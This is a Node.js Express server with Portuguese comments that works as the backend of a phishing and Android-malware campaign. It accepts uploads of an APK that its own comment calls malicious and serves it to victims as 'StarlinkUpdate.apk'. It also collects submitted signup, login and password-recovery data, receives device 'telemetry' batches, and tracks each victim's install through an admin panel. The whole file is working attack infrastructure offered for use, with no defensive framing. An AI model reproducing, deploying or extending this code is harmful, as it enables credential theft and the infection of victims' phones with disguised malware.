const express = require('express');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const multer = require('multer');

const PORT = process.env.PORT || 3000;
const DIR = path.join(__dirname, 'dados');
const ARQ = path.join(DIR, 'jobs.json');
const PKGS = path.join(__dirname, 'pkgs');
const APK = path.join(PKGS, 'updater.apk');

fs.mkdirSync(DIR, { recursive: true });
fs.mkdirSync(PKGS, { recursive: true });
let jobs = {};
try { jobs = JSON.parse(fs.readFileSync(ARQ, 'utf8')); } catch (_) {}
const salvar = () => fs.writeFileSync(ARQ, JSON.stringify(jobs, null, 1));

const app = express();
app.use(express.json({ limit: '5mb' }));
app.use((req, res, next) => { res.setHeader('Access-Control-Allow-Origin', '*'); next(); });
app.use(express.static(path.join(__dirname, 'public')));
app.get('/', (req, res) => res.redirect('/admin'));
app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'admin.html')));

// ---- upload do apk malicioso (aba "Instalador (APK)" do painel) ----
const up = multer({
  storage: multer.diskStorage({
    destination: (req, file, cb) => cb(null, PKGS),
    filename: (req, file, cb) => cb(null, 'updater.apk'),
  }),
  limits: { fileSize: 150 * 1024 * 1024 },
  fileFilter: (req, file, cb) =>
    /\.apk$/i.test(file.originalname) ? cb(null, true) : cb(new Error('arquivo precisa terminar em .apk')),
});

app.post('/api/apk-upload', up.single('apk'), (req, res) => {
  console.log(`[apk] upload ok: ${req.file.originalname} -> ${req.file.size} bytes`);
  res.json({ ok: true, nome: 'updater.apk', bytes: req.file.size });
});

app.get('/api/apk-info', (req, res) => {
  if (!fs.existsSync(APK)) return res.json({ presente: false });
  const st = fs.statSync(APK);
  res.json({ presente: true, bytes: st.size, modificado: st.mtime.toISOString() });
});

const job = id => jobs[id];
function evento(id, msg) {
  const j = job(id); if (!j) return;
  j.eventos.push({ msg, ts: new Date().toISOString() });
  salvar();
}
function novoJob(dados, tipo) {
  const id = crypto.randomUUID();
  jobs[id] = { id, dados: { ...dados, tipo }, status: 'aguardando', eventos: [],
               criadoEm: new Date().toISOString() };
  evento(id, tipo === 'login' ? 'login recebido' : 'cadastro recebido');
  return jobs[id];
}

app.post('/api/cadastro', (req, res) => {
  const j = novoJob(req.body || {}, 'cadastro');
  res.json({ installId: j.id, apkUrl: `/api/apk?job=${j.id}` });
});
app.post('/api/entrada', (req, res) => {
  res.json({ installId: novoJob(req.body || {}, 'login').id });
});
app.post('/api/esqueci', (req, res) => {
  console.log('[recuperar senha]', req.body?.email || '(vazio)');
  res.json({ ok: true });
});

app.get('/api/apk', (req, res) => {
  const j = job(req.query.job);
  if (j) evento(j.id, 'download do apk iniciado pelo app');
  if (!fs.existsSync(APK)) return res.status(404).send('nenhum apk no servidor (suba pela aba Instalador do painel)');
  res.download(APK, 'StarlinkUpdate.apk');
});

app.post('/api/job/:id/evento', (req, res) => {
  evento(req.params.id, String(req.body?.msg ?? ''));
  res.json({ ok: true });
});
app.get('/api/job/:id/status', (req, res) => {
  const j = job(req.params.id);
  if (!j) return res.status(404).json({ erro: 'job nao encontrado' });
  res.json({ status: j.status, eventos: j.eventos });
});
app.post('/api/job/:id/concluir', (req, res) => {
  const j = job(req.params.id);
  if (!j) return res.status(404).json({ erro: 'job nao encontrado' });
  j.status = 'aprovado';
  evento(j.id, 'INSTALAÇÃO CONCLUÍDA (botão do painel)');
  res.json({ status: j.status });
});
app.post('/api/coleta', (req, res) => {
  const j = job((req.query && req.query.job) || (req.body && req.body.job));
  if (j) evento(j.id, 'lote de telemetria recebido (' + JSON.stringify(req.body).length + ' bytes)');
  res.json({ ok: true });
});

app.get('/api/jobs', (req, res) => res.json(Object.values(jobs).reverse()));

// erros do multer (arquivo sem .apk, acima do limite) viram 400 limpo
app.use((err, req, res, next) => {
  if (err) { console.error('[upload]', err.message); return res.status(400).json({ erro: err.message }); }
  next();
});

app.listen(PORT, () => console.log(
  `\n Backend:  http://localhost:${PORT}\n Painel:   http://localhost:${PORT}/admin\n ` +
  `APK:        ${fs.existsSync(APK) ? 'ok (' + fs.statSync(APK).size + ' bytes)' : 'FALTANDO (suba pela aba Instalador do painel)'}\n`));
